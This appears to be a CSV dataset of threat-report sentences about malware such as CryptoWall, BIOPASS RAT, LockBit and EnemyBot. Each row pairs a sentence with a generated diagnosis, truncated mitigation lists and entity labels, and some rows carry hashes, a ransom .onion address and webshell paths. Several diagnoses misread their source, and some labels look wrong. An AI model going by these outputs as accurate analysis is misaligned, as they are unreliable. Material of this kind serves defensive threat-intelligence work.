3753,"the exception to this is enemybot, a currently prevalent botnet built with bits of code from both gafgyt and mirai source code.","diagnosis: the cybersecurity issue is the prevalence of the enemybot botnet, which is a variant of both the gafgyt and mirai malware. the entities involved are the gafgyt and mirai malware, and the enemybot","1. implementing network segmentation to isolate infected devices and prevent the spread of malware. 2. deploying intrusion detection and prevention systems to detect and block malicious traffic associated with the enemybot botnet. 3. conducting regular vulnerability assessments and patch management to address known vulnerabilities that can be exploited by the botnet. 4. implementing strong access controls and authentication mechanisms to prevent unauthorized access to network resources. 5. educating employees on cybersecurity best practices, such as avoiding suspicious emails and links, and",malware,malware,malware
329,"the attacker holds the key necessary to decrypt the files unless the victim agrees to pay a $500 ransom. unlike previous versions of cryptowall, 2.0 communicates with its command and control (c2) server through the tor anonymization network.",the diagnosis is a ransomware attack where the attacker is using the cryptowall 2.0 malware tool to encrypt the victim's files and demand a $500 ransom. the malware communicates with its command and control server through the tor anonymization network.,"1. regularly backup all important files and data to an external device or cloud storage to minimize the impact of a ransomware attack. 2. implement a robust and up-to-date antivirus software that can detect and prevent ransomware attacks. 3. use a firewall to block all incoming and outgoing traffic to known malicious ip addresses and domains associated with ransomware attacks. 4. train employees on how to identify and avoid phishing emails, which are often used to deliver ransomware payloads. 5. use a network",malware,tools,Infrastucture
338,"if these domains are confiscated or otherwise shut down, cryptowall instructs the user to download the tor browser and access a website (paytordmbdekmizq.onion) that is only accessible over the tor network. unlikely some of it’s more flexible competition, cryptowall only accepts ransom in the form of bitcoin.","the diagnosis is that there is a malware issue with cryptowall, which uses a specific url to access its tools. the malware only accepts ransom in the form of bitcoin, indicating a potential financial motivation behind the attack. there is a related-to relationship",1. implement a robust anti-malware solution that can detect and remove cryptowall from the infected system. 2. block the specific url used by cryptowall to access its tools through web filtering or firewall rules. 3. educate employees on safe browsing habits and how to identify and report suspicious emails or links. 4. implement a backup and disaster recovery solution to ensure that critical data is regularly backed up and can be restored in case of a ransomware attack. 5. use multi-factor authentication and,malware,tools,url
2059,"that being said, when looking at the html source code of the site, we discovered a couple of references to the user observed before – x4kme – and other aliases such as ukn0wn, which was observed in the helloxd ransomware samples.","the diagnosis is that the entity x4kme, along with its alias ukn0wn, has been associated with the helloxd ransomware samples. this indicates a potential cybersecurity threat involving the use of this identity to carry out malicious activities. the","1. implementing strict access controls and authentication mechanisms to prevent unauthorized access to sensitive systems and data. 2. conducting regular security audits and vulnerability assessments to identify and address potential weaknesses in the organization's it infrastructure. 3. deploying advanced threat detection and prevention tools, such as intrusion detection systems and anti-malware software, to detect and block malicious activity. 4. establishing incident response plans and procedures to quickly identify and respond to security incidents, including ransomware attacks. 5. providing regular",identity,identity,malware
350,"to protect against cryptowall 2.0 we recommend taking the following actions: adobe reader embedded bmp parsing integer overflow vulnerability cve-2014-0556 sign up to receive the latest news, cyber threat intelligence and research from us please enter your email address!","the diagnosis is that the entity (software) has a vulnerability (cve-2014-0556) that is being exploited by the malware (cryptowall 2.0). to protect against this, it is recommended to sign up for cyber threat","1. patch the vulnerability: the first step to solving the issue is to patch the vulnerability. software updates and patches are often released to fix known vulnerabilities, and it is important to ensure that the software is up to date. 2. install antivirus software: installing antivirus software can help detect and prevent malware infections. this can be done by regularly updating the software and running regular scans. 3. implement firewalls: firewalls can help prevent unauthorized access to the system and block malicious traffic. it is important",SOFTWARE,vulnerability,malware
3454,"blackgear (also known as topgear and comnie) is a cyberespionage campaign dating back to 2008, at least based on the protux backdoor used by its operators.","diagnosis: blackgear is a long-standing cyberespionage campaign that has been active since 2008, and is associated with the use of the protux backdoor malware. the campaign has been identified under several different names, including topgear and","1. implementing strong network security measures such as firewalls, intrusion detection and prevention systems, and antivirus software to detect and prevent the entry of protux backdoor malware. 2. conducting regular security audits and vulnerability assessments to identify and address any security gaps in the system. 3. implementing multi-factor authentication for all users to prevent unauthorized access to sensitive data and systems. 4. providing regular cybersecurity training and awareness programs to employees to educate them on the latest cyber threats and how to prevent them",campaign,campaign,campaign
1790,"the adss exploit abusing cve-2021-40539 due to the lack of network traffic details, we could not identify the exact cve id of the security gap the attacker used.",the entity was affected by a malware (adss exploit) that exploited a vulnerability (cve-2021-40539) through the use of exploits. the lack of network traffic details hindered the identification of the specific vulnerability used by the attacker.,"1. implementing a comprehensive network traffic monitoring system that logs all inbound and outbound traffic, including the source and destination ip addresses, ports, and protocols. this would help in identifying the specific vulnerability used by the attacker. 2. regularly updating and patching all software and systems to ensure that known vulnerabilities are addressed promptly and effectively. this would reduce the risk of exploitation by malware such as the adss exploit. 3. deploying endpoint protection solutions such as anti-malware and intrusion detection/pre",vulnerability,malware,
3174,"in addition, the attack misuses the object storage service (oss) of alibaba cloud (aliyun) to host the biopass rat python scripts as well as to store the exfiltrated data from victims.","the diagnosis is that the infrastructure of alibaba cloud (aliyun) has been compromised by malware, specifically the biopass rat python scripts, which are being hosted on the object storage service (oss) and used to exfiltrate data from victims","1. implementing a strong and up-to-date antivirus and anti-malware software to detect and prevent the biopass rat python scripts from being uploaded onto the oss. 2. conducting regular vulnerability assessments and penetration testing to identify and address any security weaknesses in the infrastructure. 3. implementing access controls and monitoring systems to prevent unauthorized access to the oss and detect any suspicious activity. 4. educating employees and users on best practices for cybersecurity, including how to identify and report potential threats.",malware,Infrastucture,
13919,"the actors behind darkside have stated that they avoid targeting companies in certain industries, including healthcare, education, the public sector, and the nonprofit sector.",the cybersecurity issue is malware and the entity involved is darkside. the relationship between the two entities is that the malware is attributed to darkside.,"1. implementing robust anti-malware software that can detect and remove darkside malware from the system. 2. conducting regular system scans to identify any potential malware infections and promptly removing them. 3. implementing network segmentation to isolate critical systems and prevent malware from spreading across the network. 4. educating employees on how to identify and avoid phishing emails, which are often used to deliver malware. 5. implementing multi-factor authentication to prevent unauthorized access to systems and data. 6. regular",malware,identity,
187,"on feb. 23, a new variant of wiper malware named hermeticwiper was discovered in ukraine.",hermeticwiper is a variant of wiper malware that targets entities in ukraine.,"1. implementing strong network security measures such as firewalls, intrusion detection and prevention systems, and anti-virus software to prevent the entry of hermeticwiper malware into the network. 2. regularly updating all software and operating systems to the latest version to patch any vulnerabilities that can be exploited by hermeticwiper. 3. conducting regular security audits to identify any potential weaknesses in the network and addressing them promptly. 4. implementing strict access controls and monitoring to prevent unauthorized access to",malware,TIME,malware
3345,3. we found an interesting cobalt strike loader (a7e9e2bec3ad283a9a0b130034e822c8b6dfd26dda855f883a3a4ff785514f97) that embeds a url that leads to the biopass rat loader.,the diagnosis is that the entity with id 10125 (a cobalt strike loader) indicates the use of a tool with id 48957 (biopass rat loader) and drops malware with id 10126. this suggests a potential cyber,1. implement network segmentation to isolate the infected system and prevent the spread of malware to other parts of the network. 2. deploy advanced threat detection and response tools that can detect and block cobalt strike and biopass rat loaders. 3. conduct regular vulnerability assessments and patch management to ensure all software and systems are up-to-date and secure. 4. implement strict access controls and multi-factor authentication to prevent unauthorized access to critical systems and data. 5. provide regular cybersecurity training and awareness programs to employees,hash,malware,tools
3396,biopass rat loader backdoor.win64.biopass.a 6a0976e5f9d07ff3d80fa2958976183758ba5fcdd4645e391614a347b4b8e64b f0b96efe2f714e7bddf76cc90a8b8c88_se.exe,the entity backdoor.win64.biopass.a is a type of malware that has been identified in the file f0b96efe2f714e7bddf76cc90a8b8c88_se.exe. the relationship between,1. install and regularly update antivirus software to detect and remove backdoor.win64.biopass.a and other types of malware. 2. implement firewalls to block unauthorized access to the network and prevent the spread of malware. 3. conduct regular security audits to identify vulnerabilities in the system and address them promptly. 4. educate employees on the importance of cybersecurity and how to identify and report suspicious activity. 5. implement access controls to limit access to sensitive information and systems. 6. use encryption,malware,hash,FILEPATH
4569,"we assess this actor is a former initial ransomware access broker who previously worked with the conti ransomware group distributing the icedid banking trojan based on overlaps in infrastructure, tools used in previous campaigns, and a unique cryptor.","diagnosis: the threat actor identified in the input was a former initial ransomware access broker who had worked with the conti ransomware group in distributing the icedid banking trojan. this was determined based on overlaps in infrastructure, tools used in","1. implement multi-factor authentication to prevent unauthorized access to sensitive systems and data. 2. conduct regular security audits and vulnerability assessments to identify and mitigate potential weaknesses in the network. 3. implement endpoint protection solutions such as anti-virus and anti-malware software to detect and prevent the installation of malicious software. 4. monitor network traffic and behavior for signs of suspicious activity, such as unusual login attempts or data exfiltration. 5. implement strict access controls and permissions to limit the exposure of sensitive",threat-actor,malware,
2488,"the signature triggered on the creation of the webshell files, of which we observed the following file written: /usr/local/tomcat/work/catalina/localhost/root/org/apache/jsp/shell_jsp.java /usr/local/tomcat/webapps/root/shell_.jsp springshell is officially assigned cve-2022-22965, and the patch was released on march 31, 2022.","the entity (identified by id 47567) is a filepath that represents the location of the webshell files. the entity (identified by id 47568) is a vulnerability, specifically cve-2022-22965, which is related","1. implement regular vulnerability scanning and patch management to identify and address vulnerabilities like cve-2022-22965 before they can be exploited. 2. implement access controls to restrict access to sensitive system files and directories, such as the location of webshell files identified by id 47567. 3. deploy intrusion detection and prevention systems to detect and block attempts to exploit vulnerabilities or upload malicious files like webshells. 4. implement network segmentation to isolate critical systems and limit the potential impact of a successful",FILEPATH,vulnerability,vulnerability
13615,"here, svchost.exe (renamed legitimate and signed launcher.exe file from tencent) sideloads utility.dll (patched legitimate file).","the diagnosis is that a malicious actor has used a legitimate file, svchost.exe (renamed launcher.exe file from tencent), to sideload a patched legitimate file, utility.dll. this indicates that there is a high likelihood of a malware infection or","1. implement a robust anti-malware solution that can detect and block malicious files and processes, including those that are disguised as legitimate files like svchost.exe. 2. conduct regular vulnerability scans and patch management to ensure that all software and systems are up-to-date and protected against known vulnerabilities that can be exploited by attackers. 3. implement strict access controls and permissions to prevent unauthorized users or applications from accessing critical files and systems. 4. educate employees on safe computing practices, such as avoiding",FILEPATH,FILEPATH,FILEPATH
2681,"the lockbit group claimed that lockbit 2.0 is “the fastest encryption software all over the world” and provided a comparative table showing the encryption speed of various ransomware samples. lockbit 2.0 also contains a self-spreading feature, clears logs and can print the ransom note on network printers until the paper runs out. a management panel that affiliates can use to manage victims and affiliate accounts, generate new ransomware builds and generate the decryptor if the demanded ransom is paid also exists.","diagnosis: the lockbit group, identified as a threat actor, has developed lockbit 2.0, a malware with advanced encryption capabilities and self-spreading features. the malware also includes a management panel for affiliates to manage victims and generate new",1. implementing strong access controls and authentication measures to prevent unauthorized access to systems and networks. 2. regularly updating software and operating systems to patch vulnerabilities that could be exploited by malware like lockbit 2.0. 3. deploying advanced threat detection and response solutions that can identify and mitigate the effects of malware attacks. 4. conducting regular security assessments and penetration testing to identify weaknesses in networks and systems that could be exploited by threat actors. 5. educating employees on the risks of,threat-actor,malware,threat-actor
13640,"a series of ongoing business email compromise (bec) campaigns that uses spear-phishing schemes on office 365 accounts has been seen targeting business executives of over 1,000 companies across the world since march 2020.","the diagnosis is a business email compromise (bec) attack that uses spear-phishing schemes on office 365 accounts to target business executives of over 1,000 companies across the world since march 2020. the attack campaign is related to","1. implement multi-factor authentication (mfa) for all office 365 accounts to prevent unauthorized access. 2. educate employees on how to identify and avoid spear-phishing emails, including suspicious links and attachments. 3. use email filtering and anti-spam software to detect and block malicious emails before they reach employees' inboxes. 4. regularly update and patch all software and systems to address vulnerabilities that attackers could exploit. 5. conduct regular security assessments and penetration testing to identify and address any",attack-pattern,SOFTWARE,TIME
4596,cve-2021-26855: microsoft exchange server remote code execution vulnerability (pre-authenticated server-side request forgery [ssrf]) cve-2021-27065: microsoft exchange server remote code execution vulnerability (post-authenticated arbitrary file write) fig - ms exchange client access protocol architecture the client access services (outlook web app portal) proxies the incoming connections to the backend services.,"diagnosis: microsoft exchange server is vulnerable to remote code execution due to two different vulnerabilities, cve-2021-26855 and cve-2021-27065. the client access services (outlook web app portal) proxies the incoming connections to",1. patching: install the necessary security updates and patches provided by microsoft to fix the vulnerabilities (cve-2021-26855 and cve-2021-27065) in the microsoft exchange server. 2. network segmentation: implement network segmentation to isolate the microsoft exchange server from other critical systems and limit the attack surface. 3. multi-factor authentication: implement multi-factor authentication (mfa) to protect against unauthorized access to the microsoft exchange server and outlook web app portal.,vulnerability,vulnerability,vulnerability
13576,"if the victim enters the credential in the fake form and clicks anywhere on the page, the script will take the credentials, encode them using base64, replace some characters with custom substrings, and then upload these to water pamola’s server. figure 4.","the diagnosis for this cybersecurity issue is a case of malware infection that communicates with an infrastructure. the victim is tricked into entering their credentials into a fake form, which triggers a script to encode and upload their credentials to water pamola's server. the",1. implementing a robust anti-malware solution that can detect and block the malware before it can infect the victim's system. 2. educating employees and users about the risks of phishing attacks and how to identify and avoid them. 3. implementing two-factor authentication (2fa) for all sensitive accounts to prevent unauthorized access even if the credentials are compromised. 4. implementing network segmentation to isolate infected systems and prevent the malware from spreading to other systems. 5. regularly updating software,Infrastucture,malware,
3169,"we discovered a new malware that targets online gambling companies in china via a watering hole attack, in which visitors are tricked into downloading a malware loader disguised as a legitimate installer for well-known apps such as adobe flash player or microsoft silverlight.",diagnosis: a watering hole attack using a malware loader disguised as a legitimate installer is targeting online gambling companies in china. the malware is being used to steal sensitive information from the targeted companies. the attack is being carried out by an unidentified identity and is,1. implement strong access controls and authentication mechanisms to prevent unauthorized access to sensitive information. 2. regularly update and patch software and systems to prevent vulnerabilities that can be exploited by malware. 3. conduct regular security awareness training for employees to educate them on the risks of downloading and installing software from untrusted sources. 4. deploy advanced threat detection and response solutions to monitor network traffic and detect and respond to suspicious activity in real-time. 5. use endpoint protection software to detect and prevent malware from infecting,attack-pattern,attack-pattern,malware
3395,biopass rat loader backdoor.win64.biopass.a 69d930050b2445937ec6a4f9887296928bf663f7a71132676be3f112e80fe275 test.exe,"the entity ""test.exe"" has been infected with the biopass rat loader, which is a type of malware identified as backdoor.win64.biopass.a. the malware has been identified by its hash value, 69d930050",1. use an anti-virus software to remove the malware and prevent future infections. 2. implement network segmentation to isolate infected devices and prevent the spread of malware. 3. use intrusion detection and prevention systems to detect and block malicious traffic. 4. conduct regular vulnerability assessments and patch management to ensure all software and systems are up to date and secure. 5. implement access controls and strong passwords to prevent unauthorized access to sensitive information. 6. provide regular cybersecurity training to employees to raise awareness and prevent human,malware,hash,FILEPATH
4591,"according to shodan, on march 4, there were more than 266,000 exchange servers vulnerable to the proxylogon vulnerability, a day after the patch was released.","the diagnosis is that there is a vulnerability in exchange servers known as proxylogon, which was not patched in a timely manner, leaving over 266,000 servers vulnerable to attacks.",1. patch management: ensure that all software and applications are up to date with the latest security patches and updates. this can be done by implementing a patch management system that regularly scans and updates vulnerable software. 2. network segmentation: implement network segmentation to isolate critical assets and limit access to sensitive data. this can help prevent the spread of malware and limit the damage caused by a successful attack. 3. two-factor authentication: implement two-factor authentication to add an extra layer of security to user accounts,TIME,identity,SOFTWARE
13029,"recently observed coldriver credential phishing domains: ghostwriter, a belarusian threat actor, recently introduced a new capability into their credential phishing campaigns.","belarusian threat actor ghostwriter is using a new capability in their credential phishing campaign, which involves the creation of coldriver phishing domains.","1. implementing email filters and spam detection software to identify and block phishing emails containing coldriver domains. 2. conducting regular security awareness training for employees to educate them on how to identify and avoid phishing scams. 3. deploying multi-factor authentication (mfa) to add an extra layer of security to login credentials, making it harder for attackers to gain access. 4. regularly monitoring and reviewing domain registrations to identify and take down any suspicious or malicious domains. 5. utilizing threat",campaign,attack-pattern,threat-actor
3423,biopass rat loader backdoor.win64.biopass.a fa1d70b6b5b1a5e478c7d9d840aae0cc23d80476d9eea884a73d1b7e3926a209 64.exe biopass rat loader backdoor.win64.biopass.a fa7fbca583b22d92ae6d832d90ee637cc6ac840203cd059c6582298beb955aee test.exe biopass rat loader backdoor.,"the diagnosis is that the entity biopass rat loader is infected with the malware backdoor.win64.biopass.a, which is indicated by the hash values fa1d70b6b5b1a5e478c7d",1. install and regularly update antivirus and anti-malware software to detect and remove backdoor.win64.biopass.a and other similar malware. 2. implement network segmentation to isolate the infected entity and prevent the spread of the malware to other parts of the network. 3. conduct regular vulnerability assessments and penetration testing to identify and address potential security weaknesses that could be exploited by attackers. 4. implement strong access controls and authentication mechanisms to prevent unauthorized access to sensitive data and systems. 5. educ,malware,malware,malware
273,"our threat prevention and web application and api security products added coverage for the octobercms vulnerability exploited in the whispergate attacks, and we released an xsoar playbook to help organizations hunt for this threat.","the cybersecurity issue is a malware campaign, specifically the whispergate attacks. the entity affected is the octobercms vulnerability, which was exploited in the attacks. the relationship between the entities is that the vulnerability delivered the malware campaign. the organization has addressed the issue",1. patching the vulnerability: the organization can address the issue by patching the octobercms vulnerability that was exploited in the whispergate attacks. this can prevent future attacks from exploiting the same vulnerability. 2. anti-malware software: installing anti-malware software can help detect and remove any malware that may have been installed on the affected system. this can prevent further damage from the malware campaign. 3. employee training: educating employees on how to identify and avoid phishing emails and suspicious links,malware,campaign,SOFTWARE
4264,"interestingly, one of those keys, “xldbszcd”, was found in a file stealer used by confucius (472ea4929c5e0fb4e29597311ed90a14c57bc67fbf26f81a3aac042aa3dccb55, detected as tspy_confsteal.a) as well as in two other file stealers.","diagnosis: threat actor identified as confucius (472ea4929c5e0fb4e29597311ed90a14c57bc67fbf26f81a3aac042aa3dccb55, detected as","1. implementing advanced threat detection tools that can identify and track the activities of confucius and other threat actors. 2. conducting regular security audits to identify vulnerabilities in the system and take necessary actions to mitigate them. 3. implementing strong access control mechanisms, such as multi-factor authentication and privileged access management, to prevent unauthorized access to sensitive data. 4. educating employees on cybersecurity best practices, such as avoiding phishing attacks and maintaining strong passwords. 5. implementing a robust incident response",hash,malware,threat-actor
3342,"information from the stolen certificates 2. while checking the stolen certificates, we found a server-side variant of the derusbi malware sample (e5fdb754c1a7c36c288c46765c9258bb2c7f38fa2a99188a623182f877da3783) that was signed with the same stolen certificate.","the entity (server) has been infected with the derusbi malware, which was signed using a stolen certificate. the relationship between the two entities indicates that the stolen certificate was used to sign the malware and infect the server. the diagnosis is a case",1. implement a multi-factor authentication system to prevent unauthorized access to the certificate. 2. regularly monitor and update security software to detect and prevent malware infections. 3. use a certificate revocation list (crl) to immediately revoke stolen certificates. 4. implement network segmentation to limit the spread of malware infections. 5. conduct regular security audits and penetration testing to identify vulnerabilities and prevent future attacks.,hash,malware,
736,"dubbed omigod, the four vulnerabilities were found to directly affect azure cloud instances.","diagnosis: the cybersecurity issue is a vulnerability, specifically dubbed omigod, which directly affects azure cloud instances. the entity affected by this issue is the software used in azure cloud instances. the relationship between the vulnerability and the software is that the software","potential cybersecurity solutions to address the omigod vulnerability in azure cloud instances and the software include: 1. patching and updating: microsoft has released security updates to address the omigod vulnerability. azure users should ensure that their instances are up-to-date with the latest patches and updates. 2. implementing access controls: azure users should implement access controls to limit the exposure of their instances to potential attackers. this can include implementing multi-factor authentication, restricting access to sensitive data, and implementing network segmentation.",vulnerability,SOFTWARE,
13474,"as one example, we've seen new activity from “hack-for-hire” firms, many based in india, that have been creating gmail accounts spoofing the who.","the diagnosis is a phishing attack carried out by a hack-for-hire threat actor based in india, targeting the world health organization (who) by spoofing their identity through the creation of fake gmail accounts.","1. implementing multi-factor authentication (mfa) for all who email accounts to prevent unauthorized access and reduce the risk of phishing attacks. 2. conducting regular security awareness training for all who employees to educate them on how to identify and report phishing attempts. 3. implementing email authentication protocols such as domain-based message authentication, reporting, and conformance (dmarc) and sender policy framework (spf) to prevent spoofing of who email addresses. 4. deploying advanced threat detection and",threat-actor,location,identity
13663,"in a july email sent to a c-level executive, we learned that the base domain url is u10450540[.]ct[.]sendgrid[.]net, with the final url being *getting-panes[.]sfo2*. figure 3.","phishing attack targeting the c-level executive, with the base domain url being u10450540[.]ct[.]sendgrid[.]net and the final url being *getting-panes[.]sfo2*. the email is related to","1. implementing multi-factor authentication for all email accounts, especially those of c-level executives, to prevent unauthorized access. 2. conducting regular cybersecurity awareness training for employees, particularly on how to identify and avoid phishing attacks. 3. installing anti-phishing software on all devices used by employees to prevent phishing emails from reaching their inboxes. 4. regularly updating and patching all software and applications to ensure they are protected against known vulnerabilities and exploits. 5. implementing email filtering and blocking rules",URL,URL,identity
4815,"based on our analysis, we believe that the stopwar app was developed by pro-ukrainian developers and was the inspiration for what turla actors based their fake cyberazov dos app off of.","the cybersecurity issue is the creation and distribution of a fake dos app (cyberazov) by the threat-actor group turla. the entity involved in this issue is the stopwar app, which was developed by pro-ukrain","1. implement strict app store guidelines and vetting processes to prevent the distribution of fake apps. 2. conduct regular security audits of apps to identify and remove any malicious code or vulnerabilities. 3. use advanced threat intelligence tools to monitor and detect suspicious activity and potential threats, such as the creation and distribution of fake apps. 4. educate users on how to identify and avoid downloading fake apps, and encourage them to only download apps from trusted sources. 5. implement strong authentication protocols and access controls to",SOFTWARE,malware,threat-actor
3442,vulnerable systems mitigation actions observed in the wild conclusion additional resources indicators of compromise the f5 product vulnerable to cve-2022-1388 is big-ip with the following versions: the vulnerability exists within the icontrol rest framework used by big-ip.,diagnosis: the f5 big-ip product is vulnerable to cve-2022-1388 due to a vulnerability in the icontrol rest framework. mitigation actions should be taken to address this vulnerability. observations of this vulnerability have been seen,1. patching: apply the latest security patch provided by f5 networks to fix the vulnerability in the icontrol rest framework. 2. network segmentation: isolate the f5 big-ip product from the rest of the network to minimize the attack surface and prevent lateral movement in case of a successful attack. 3. access control: implement strict access controls and authentication mechanisms to limit access to the f5 big-ip product. 4. monitoring: use security monitoring tools to detect any suspicious activity,vulnerability,tools,vulnerability
4629,"in december 2021, tag discovered a novel charming kitten tool, named hyperscrape, used to steal user data from gmail, yahoo!, and microsoft outlook accounts.","the diagnosis is that a threat actor identified as charming kitten used a novel malware tool named hyperscrape to steal user data from gmail, yahoo!, and microsoft outlook accounts. this incident was discovered by tag in december 2021.",1. implement multi-factor authentication for all email accounts to prevent unauthorized access. 2. regularly update and patch all software and applications to prevent vulnerabilities that can be exploited by malware. 3. deploy anti-malware solutions that can detect and remove hyperscrape and other similar malware. 4. train employees on how to identify and report suspicious emails and attachments. 5. implement network segmentation to limit access to sensitive data and prevent lateral movement by attackers. 6. conduct regular security audits and penetration,identity,threat-actor,malware
1360,"to determine how this vulnerability was exploited, we analyzed the patch that developers added to octobercms version 1.0.472 to mitigate the cve-2021-32648 vulnerability.",the vulnerability (cve-2021-32648) was found in octobercms version 1.0.472 software. the patch was analyzed to determine how the vulnerability was exploited. the relationship between the vulnerability and the software is that the software has,"potential cybersecurity solutions to address the vulnerability in octobercms version 1.0.472 software (cve-2021-32648) include: 1. apply the patch: the first and most obvious solution is to apply the patch provided by the software vendor. this will address the vulnerability and prevent attackers from exploiting it. 2. update the software: if the software version is outdated, it is recommended to update to the latest version. this will not only address the vulnerability but also provide additional security features",vulnerability,SOFTWARE,
2749,vulnerability details cve-2014-6271 exists in all versions of bash and is related to how environment variables are processed when the shell starts up.,the entity in question is a tool that is affected by the bash vulnerability (cve-2014-6271) due to the way environment variables are processed when the shell starts up. the relationship between the tool and the vulnerability is that the tool has,1. patching and updating the affected tool to address the bash vulnerability. 2. implementing intrusion detection and prevention systems to monitor and block any attempts to exploit the vulnerability. 3. implementing access controls and restrictions to limit the exposure of the affected tool to potential attackers. 4. conducting regular vulnerability assessments and penetration testing to identify and address any potential vulnerabilities in the tool. 5. educating employees and users on safe computing practices and the importance of keeping software up-to-date to prevent cyber attacks,vulnerability,tools,
914,"it’s also interesting to note that each time pclock2 scans a directory or encrypts a file, it makes an http post request to the c2 server.","the diagnosis is that the malware (pclock2) is communicating with a command-and-control (c2) server through http post requests, indicating the presence of an infrastructure issue.","1. implement a firewall to block outgoing traffic to suspicious ip addresses associated with the c2 server. 2. deploy an intrusion detection system (ids) to monitor network traffic and detect any suspicious behavior, such as http post requests to unknown domains. 3. use antivirus software to detect and remove the pclock2 malware from infected systems. 4. conduct regular vulnerability assessments and penetration testing to identify and address any weaknesses in the infrastructure that could be exploited by cybercriminals. 5. implement a security information",Infrastucture,malware,
5017,"here is a deeper look at the campaign activity tag has observed and the actions the team has taken to protect our users over the past few weeks: apt28 or fancy bear, a threat actor attributed to russia gru, was observed targeting users in ukraine with a new variant of malware.","diagnosis: apt28 or fancy bear, a threat actor attributed to russia gru, targeted users in ukraine with a new variant of malware. the location of the targeted users is ukraine, and the identity of the threat actor is apt28","1. implement strong network security measures such as firewalls, intrusion detection and prevention systems, and network segmentation to prevent apt28 from gaining access to critical systems and data. 2. deploy advanced threat detection and response solutions that use machine learning and ai algorithms to detect and respond to apt28 attacks in real-time. 3. conduct regular security audits and vulnerability assessments to identify and remediate weaknesses in the network that could be exploited by apt28. 4. train employees on best practices for cybersecurity",location,identity,threat-actor
3754,the exploits involving enemybot eventually download enemybot samples that themselves embed cve-2022-22954 exploits for further exploitation and propagation.,"the diagnosis is that the cybersecurity issue involves the propagation of malware through the exploitation of a vulnerability (cve-2022-22954). the entity involved is enemybot, which is being used to download samples that embed the exploit for further propagation. the",1. patch the vulnerability (cve-2022-22954) to prevent further exploitation. 2. implement intrusion detection and prevention systems to detect and block any attempts to exploit the vulnerability. 3. deploy endpoint protection solutions to detect and block any malware propagation attempts. 4. conduct regular vulnerability assessments and penetration testing to identify and address any vulnerabilities before they can be exploited. 5. implement network segmentation to limit the spread of malware in case of a successful exploitation. 6. train employees on cybersecurity best practices,malware,vulnerability,malware
5284,"our data also shows that although cyclops blink is a state-sponsored botnet, its c&c servers and bots affect watchguard firebox and asus devices that do not belong to critical organizations, or those that have an evident value on economic, political, or military espionage.","the diagnosis is that a state-sponsored botnet called cyclops blink is infecting watchguard firebox and asus devices with malware. these devices are not critical organizations and do not have an evident value on economic, political, or military espionage. the malware",1. implement regular software updates and patches to address vulnerabilities in watchguard firebox and asus devices. 2. use anti-malware software to detect and remove any malware infections on the devices. 3. implement network segmentation to isolate infected devices and prevent the spread of malware. 4. implement access controls and strong passwords to prevent unauthorized access to devices. 5. conduct regular security audits and penetration testing to identify and address any security weaknesses in the network. 6. use network monitoring tools to detect any suspicious,malware,SOFTWARE,SOFTWARE
2849,"it has been reported that the doublepulsar backdoor (also from the equation group leak by shadow brokers) is installed and used to execute the malware after successful exploitation of a host via eternalblue, but this warrants further analysis.",the diagnosis is that a threat actor has exploited vulnerabilities (eternalblue and doublepulsar) to execute malware on the affected host. this indicates a significant cybersecurity breach and highlights the need for immediate remediation and ongoing monitoring to prevent further,1. patching and updating vulnerable systems to prevent exploitation of known vulnerabilities such as eternalblue and doublepulsar. 2. implementing network segmentation and access controls to limit the spread of malware and prevent lateral movement within the network. 3. deploying endpoint protection solutions such as antivirus and intrusion detection/prevention systems to detect and block malicious activity. 4. conducting regular vulnerability assessments and penetration testing to identify and address potential weaknesses in the network. 5. training employees on cybersecurity best practices,threat-actor,threat-actor,vulnerability
1256,"this campaign involved five separate phishing attacks, each carrying a different variant of sysget malware, also known as hellobridge.","diagnosis: the entity (target) was subjected to a series of phishing attacks, each carrying a different variant of sysget malware (hellobridge). the relationship between the malware variants suggests that they are all related and likely part of the same campaign.",1. implementing multi-factor authentication: this solution can be used to prevent unauthorized access to accounts and systems. it will make it harder for attackers to gain access to sensitive information even if they have obtained login credentials through phishing attacks. 2. regular employee training and awareness: this solution can help employees to identify and avoid phishing attacks. it can also help them to understand the importance of keeping their systems and software up-to-date. 3. implementing network segmentation: this solution can help to isolate critical systems,attack-pattern,malware,malware
1687,"while the sunorcal malware family has been confirmed to have been active since 2013, possibly even earlier, this new variant has been observed targeting regions outside of the typical target radius for this threat group, now expanding to include vietnam and myanmar.","sunorcal malware family is targeting new regions outside of their typical target radius, including vietnam and myanmar. this suggests that the threat group is expanding their operations and may pose a greater risk to organizations in these regions. it is recommended that organizations in","1. implement strong email security measures, such as spam filters and email authentication protocols, to prevent phishing emails and malicious attachments from reaching employees' inboxes. 2. deploy advanced threat detection and response solutions that use machine learning and artificial intelligence to identify and block sunorcal malware attacks in real-time. 3. conduct regular security awareness training for employees to educate them on the latest cyber threats and how to avoid falling victim to them. 4. use endpoint protection software that can detect and block malware infections",malware,TIME,location
837,"while kernel apc attacks aren’t well known and can be hard to understand, their proven success in wanacrypt0r/wannacry and the petya/notpetya make them an important threat to understand because proven attack techniques are quickly adopted widely.","the diagnosis is a potential kernel apc attack using malware, as evidenced by the successful use of this technique in the wanacrypt0r/wannacry and petya/notpetya attacks. the entities involved include the attack pattern (",1. implementing regular software updates and patches to mitigate vulnerabilities in the kernel and other system components. 2. deploying advanced endpoint protection solutions that use behavior-based detection and response mechanisms to identify and stop malware before it can execute. 3. implementing network segmentation and access controls to prevent lateral movement of malware within the network. 4. conducting regular security assessments and penetration testing to identify and remediate vulnerabilities in the system. 5. enforcing strict password policies and multi-factor authentication to prevent unauthorized access,malware,attack-pattern,malware
4473,"reporting by citizenlab linked this activity to candiru, an israeli spyware vendor.","diagnosis: the cybersecurity issue is related to the use of spyware by the israeli vendor candiru. the entity involved is citizenlab, which reported the activity. the relationship between the entities is that candiru, the threat actor, is",1. implementing robust anti-spyware and anti-malware software on all devices and systems to detect and prevent any potential spyware attacks. 2. conducting regular vulnerability assessments and penetration testing to identify and address any weaknesses in the system that could be exploited by threat actors like candiru. 3. implementing strict access controls and monitoring systems to prevent unauthorized access to sensitive data and systems. 4. educating employees and users on the risks of spyware and how to identify and report,identity,threat-actor,location
3340,it is well known that the winnti group has previously used stolen certificates from game studios to sign its malware.,"the winnti group, a known threat actor, is using stolen certificates from game studios to sign its malware, indicating a sophisticated attack pattern. this suggests a possible compromise of the studios' cybersecurity measures and highlights the importance of securing digital certificates.",1. regularly monitor and update digital certificates to ensure they have not been compromised or stolen. 2. implement two-factor authentication for certificate management to reduce the risk of unauthorized access. 3. use digital signature verification tools to detect and block malware signed with stolen certificates. 4. conduct regular vulnerability assessments and penetration testing to identify and address potential weaknesses in cybersecurity measures. 5. implement a comprehensive cybersecurity awareness training program for employees to educate them on the importance of digital certificate security and how to,attack-pattern,threat-actor,
